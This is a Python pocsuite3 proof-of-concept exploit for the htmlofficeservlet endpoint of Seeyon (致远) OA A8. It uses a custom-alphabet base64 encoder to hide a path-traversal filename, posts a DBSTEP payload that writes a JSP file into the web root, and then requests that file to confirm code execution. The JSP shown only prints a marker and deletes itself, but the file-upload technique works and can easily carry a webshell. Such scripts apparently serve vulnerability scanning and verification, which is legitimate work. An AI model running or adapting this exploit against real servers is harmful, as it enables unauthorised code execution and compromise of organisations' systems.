#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


def input_encode(origin_bytes):
	"""
	重构 base64 编码函数
	"""
	# 将每一位bytes转换为二进制字符串
	base64_charset = "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6"
	base64_bytes = ['{:0>8}'.format(bin(ord(b)).replace('0b', '')) for b in origin_bytes]

	resp = ''
	nums = len(base64_bytes) // 3
	remain = len(base64_bytes) % 3

	integral_part = base64_bytes[0:3 * nums]
	while integral_part:
		# 取三个字节，以每6比特，转换为4个整数
		tmp_unit = ''.join(integral_part[0:3])
		tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]
		# 取对应base64字符
		resp += ''.join([base64_charset[i] for i in tmp_unit])
		integral_part = integral_part[3:]

	if remain:
		# 补齐三个字节，每个字节补充 0000 0000
		remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8
		# 取三个字节，以每6比特，转换为4个整数
		# 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=
		tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]
		resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='
	return resp


class TestPOC(POCBase):
	vulID = ''''''
	cveID = ''''''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = ''''''
	author = ''''''
	vulDate = ''''''
	createDate = ''''''
	updateDate = ''''''
	name = '''致远_A8_htmlofficeservlet_file_upload'''
	desc = '''致远OA-A8系统存在远程命令执行漏洞'''
	solution = ''''''
	severity = '''high'''
	vulType = ''''''
	taskType = '''app-vul'''
	references = ['''''']
	appName = ''''''
	appVersion = ''''''
	appPowerLink = ''''''
	samples = ['''''']
	install_requires = ['''''']

	def _verify(self):
		result = {}
		self.url, ip, port = parse_ip_port(self.target)
		vul_url = make_verify_url(self.url, "/seeyon/htmlofficeservlet", mod=0)

		headers = {
			"Pragma": "no-cache",
			"Cache-Control": "no-cache",
			"Upgrade-Insecure-Requests": "1",
			"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
			"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.9",
			"Connection": "close",
			"Content-Length": "429",
		}
		file_name = input_encode('..\\..\\..\\ApacheJetspeed\\webapps\\seeyon\\qwer960452.jsp')
		payload = """DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV\r\n
		OPTION=S3WYOSWLBSGr\r\n
		currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n
		CREATEDATE=wUghPB3szB3Xwg66\r\n
		RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n
		originalFileId=wV66\r
		originalCreateDate=wUghPB3szB3Xwg66\r\n
		FILENAME=""" + file_name + """\r\n
		needReadFile=yRWZdAS6\r
		originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n
		<%
out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
new java.io.File(application.getRealPath(request.getServletPath())).delete();
%>6e4f045d4b8506bf492ada7e3390d7ce"""

		requests.post(url=vul_url, data=payload, headers=headers, verify=False, timeout=15, allow_redirects=False)
		upload_url = make_verify_url(self.url, "/seeyon/qwer960452.jsp", mod=0)
		resp = requests.get(upload_url, verify=False, timeout=15, allow_redirects=False)
		if b'e165421110ba03099a1c0393373c5b43' in resp.content and resp.status_code == 200:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = resp.url
			result['VerifyInfo']['port'] = port
		return self.parse_output(result)

	_attack = _verify

	def parse_output(self, result):
		#parse output
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output


register_poc(TestPOC)
